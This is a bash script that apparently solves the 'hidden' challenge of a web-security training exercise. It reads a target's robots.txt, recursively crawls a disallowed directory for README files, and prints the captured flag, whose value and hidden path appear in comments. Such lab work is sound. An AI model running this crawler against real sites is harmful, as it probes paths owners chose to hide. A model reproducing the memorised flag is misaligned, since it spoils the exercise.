#!/bin/bash
#
# ./get-the-hidden-flag.sh "ip"
# 

theme="hidden"
file="`dirname $0`/scrap_README.md"

function get_tools
{
	# $1: the command to test if here or need to install
	tool="${1}"
	which "${tool}" 2>&1 > /dev/null
	if [ $? -ne 0 ]
	then
		if [ `uname` = "Darwin" ]
		then
			brew install "${tool}"
		else
			apt-get install -y "${tool}"
		fi
		return 1
	fi
	return 0
}
get_tools "curl"

function simplified_curl_request
{
	# $1:	url/ip to test
	# $2:	queries string to test (those one which from SQL injection, pass all
	#		query string by url ($1)
	curl -svG --data-urlencode "${2}" "${1}" 
	return $?
}

function get_nb_entries
{
	#$1: the datas that we need to count the units
	echo -e "${1}" | awk 'END {print NR}'
	return $?
}

function extract_url_from_html_tag
{
	# $1 url where to parse datas
	curl -sL "${1}" | grep -Eo "((href|src)=)\"[a-zA-Z0-9:/=&\+\?_.\(\) -]*\"" | awk -v root="${1}" -F\" '{print root $(NF-1)}'
}

echo -e "\n\033[35m6. === ${theme} ===============================================\033[0m\n"

function scrap_html_url_readme
{
	# $1: starting url
	
	local i starting_url urls_scrapped url_scrapped nb_urls_scrapped
	starting_url="${1}"
	if [ "${starting_url: -1}" != "/" ]
	then
		starting_url+="/"
	fi

	urls_scrapped=`extract_url_from_html_tag "${starting_url}"`
	let "nb_urls_scrapped=`get_nb_entries "${urls_scrapped}"`"
	echo -e "\nThen, we get ${nb_urls_scrapped} urls:\n${urls_scrapped}\n"
	for (( i=1; i <= ${nb_urls_scrapped}; i++ ))
	do
		url_scrapped=`echo -e "${urls_scrapped}" | awk -v line="${i}" 'NR == line {print $0}'`
		if ! [[ "${url_scrapped}" =~ "../" ]] && ! [[ "${url_scrapped}" =~ "README" ]]
		then
			scrap_html_url_readme "${url_scrapped}"
		elif [[ "${url_scrapped}" =~ "README" ]]
		then
			echo -e "\033[33mREADME is found in ${url_scrapped}. Let's see what's inside:" >> "${file}"
			curl -s "${url_scrapped}" >> "${file}"
			echo -e "################################################################################\033[0m" >> "${file}"
		fi
	done
}

printf "This test takes at least 20 min to be done. But We have a pre-built result, do you prefer using it? [y/n] "
read -n1 answer
printf "\n\n"

if [ ${answer} = "n" ] || ! [ -f "${file}" ]
then
	echo > "${file}"
	result=`curl -sv "${1}/robots.txt" | grep "Disallow" | awk '{print $2}'`
	url_hidden_directory=`echo -e "${result}" | awk -v root="http://${1}" 'NR == 2 {print root $0}'`
	scrap_html_url_readme "${url_hidden_directory}/"
fi
awk 'NR==47080,NR==47082 {print $0}' "${file}" 
# flag obtenu d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
# Hey, here is your flag : d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
# url ip_darkly/.hidden/whtccjokayshttvxycsvykxcfm/igeemtxnvexvxezqwntmzjltkt/lmpanswobhwcozdqixbowvbrhw/
echo -e "\n\$\$\$ ${theme} \$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\n"
